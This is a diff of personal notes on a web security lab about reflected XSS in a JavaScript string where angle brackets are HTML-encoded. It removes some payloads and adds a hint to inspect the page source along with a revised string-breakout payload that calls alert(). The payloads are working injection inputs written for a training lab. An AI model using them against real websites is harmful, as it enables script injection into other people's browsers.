@@ -2,11 +2,9 @@ Lab #9 - Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
 Target Goal - Exploit the reflected XSS vulnerability to call the alert function.
 
+In the elements tab in inspect, just find the searched term and see how you can add js syntax
+
 Analysis:
 
 
-var searchTerms = ''-alert(1)-'';
-
-'; alert(1); '
-
-'-alert(1)-'
+'lorem'; alert(); var x='t'
